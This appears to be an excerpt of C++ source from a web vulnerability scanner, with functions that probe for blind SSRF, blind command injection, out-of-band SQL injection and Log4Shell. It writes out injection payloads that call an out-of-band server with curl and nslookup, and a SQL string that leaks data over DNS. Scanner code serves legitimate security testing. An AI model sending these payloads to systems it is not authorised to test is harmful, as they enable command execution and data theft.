...
std::vector<Finding> scan_blind_ssrf(const Config& cfg, HttpClient& http, const CrawlResult& crawl) {
  ...
  if (!crawl.urls.empty()) {
    findings.push_back({"Blind SSRF", "info", crawl.urls[0], "OOB SSRF payloads injected (check " + cfg.oob_server + ")", "", oob, ""});
  }
  return findings;
}

/// Blind command injection via OOB.
std::vector<Finding> scan_blind_cmdi(const Config& cfg, HttpClient& http, const CrawlResult& crawl) {
  std::vector<Finding> findings;
  if (cfg.no_oob) return findings;
  ...
  const std::vector<std::string> payloads = {"; nslookup " + oob_domain, "| curl " + cfg.oob_server + "/cmdi",
                                             "$(curl " + cfg.oob_server + "/cmdi)", "`nslookup " + oob_domain + "`"};
  ...
  if (!crawl.urls.empty()) {
    findings.push_back({"Blind CMDi", "info", crawl.urls[0], "OOB CMDi payloads injected", "", "", ""});
  }
  return findings;
}

/// Blind SQLi via OOB (DNS exfiltration).
std::vector<Finding> scan_blind_sqli_oob(const Config& cfg, HttpClient& http, const CrawlResult& crawl) {
  std::vector<Finding> findings;
  if (cfg.no_oob) return findings;
  ...
  const std::vector<std::string> payloads = {"' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',version(),'." + oob_domain + "\\\\a'))--",
  ...
  if (!crawl.urls.empty()) {
    findings.push_back({"Blind SQLi OOB", "info", crawl.urls[0], "OOB SQLi payloads injected", "", "", ""});
  }
  return findings;
}

/// Log4Shell (CVE-2021-44228) — JNDI injection.
std::vector<Finding> scan_log4shell(const Config& cfg, HttpClient& http, const CrawlResult& crawl) {
  std::vector<Finding> findings;
  if (cfg.no_oob) return findings;
  ...
  const std::vector<std::string> headers = {"X-Forwarded-For", "User-Agent", "Referer",     "X-Api-Version",
  ...
  if (!crawl.urls.empty()) {
    findings.push_back({"Log4Shell", "info", crawl.urls[0], "Log4Shell payloads injected (check OOB server)", "", payload, ""});
  }
  return findings;
}
